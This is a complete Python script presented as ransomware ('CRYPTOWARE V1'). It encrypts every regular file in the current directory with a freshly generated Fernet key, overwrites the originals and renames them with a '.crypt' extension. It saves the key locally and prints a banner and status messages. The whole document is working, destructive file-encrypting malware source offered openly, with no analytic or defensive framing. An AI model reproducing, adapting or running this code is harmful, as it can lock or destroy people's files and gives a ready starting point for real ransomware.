#!/usr/bin/env python3 
# 
# CRYPTOWARE V1 
# written by metr0
# 12-31-22

'''
will encrypt files in the current directoy
'''

import time 
import os 
from cryptography.fernet import Fernet

class text:
    banner = '''
    +-++-++-++-++-++-++-++-++-+
    |C R Y P  T  O  W  A  R  E|
    +-++-++-++-++-++-++-++-++-+
           '''
           
class ansi:
    RED = '\033[1;31m' 
    GREEN = '\033[1;32m' 
    BOLD = '\033[1m'
    CYAN = '\033[1;36m'
    END = '\033[0m'

def main():
    
    files = [] 
    count = 0
    key = Fernet.generate_key()
    
    print(f'{ansi.RED} {text.banner} {ansi.END}')


	# loops through and parses the files 
    for file in os.listdir():        
        if file == 'cryptoware.py':
            continue
        elif file == 'thekey.key':
            print(f'{ansi.RED}[!]{ansi.END} files has already been encrypted!\n')
            time.sleep(3)
            exit()
        elif file == 'decrypt.py':
            continue 
        elif os.path.isdir(file):
            continue
        files.append(file)
        count += 1 
    
    # encrypts the files
    with open('thekey.key', 'wb') as thekey:
        thekey.write(key)
	
    try: 
	
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            print(f'{ansi.CYAN}{file} has been encrypted{ansi.CYAN}')
		    
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
            os.rename(file, file + '.crypt')
    
    except OSError:
        print('------------------------------------------------')
        print(f'{ansi.RED}[!]{ansi.END} something went wrong :(')
        print('do you have permission on these files?')
        time.sleep(3)
    
    else:

        print(f'{ansi.GREEN}[*]{ansi.END} {count} Files has been encrypted ^.^')
        print(f'{ansi.GREEN}[*]{ansi.END} key generated')
    time.sleep(3)

if __name__ == "__main__":
    main()
